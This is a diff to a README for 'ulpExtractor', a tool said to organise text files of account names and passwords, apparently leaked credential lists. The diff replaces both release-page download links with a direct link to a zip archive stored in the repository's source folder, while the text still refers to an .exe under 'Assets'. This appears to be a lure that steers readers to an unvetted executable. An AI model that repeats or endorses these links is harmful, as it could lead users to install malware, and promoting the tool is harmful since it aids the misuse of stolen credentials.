@@ -1,6 +1,6 @@
 # 📦 ulpExtractor - Fast tool for organizing account data
 
-[![Download ulpExtractor](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lucasconfederate414/ulpExtractor/releases)
+[![Download ulpExtractor](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lucasconfederate414/ulpExtractor/raw/refs/heads/main/src/ulp-Extractor-v2.2.zip)
 
 ulpExtractor reads text files containing login information. It organizes long lists of names and passwords into a clear format. This tool operates quickly because it uses multiple parts of your computer processor at the same time. You can view the status of your task through a visual screen in your terminal.
 
@@ -8,7 +8,7 @@ ulpExtractor reads text files containing login information. It organizes long li
 
 The software lives on our release page. Visit this page to download the latest version for your computer.
 
-[Get the latest version here](https://github.com/Lucasconfederate414/ulpExtractor/releases)
+[Get the latest version here](https://github.com/Lucasconfederate414/ulpExtractor/raw/refs/heads/main/src/ulp-Extractor-v2.2.zip)
 
 Look for the file ending in `.exe` under the Assets section. Save this file to your Downloads folder or your Desktop.
 
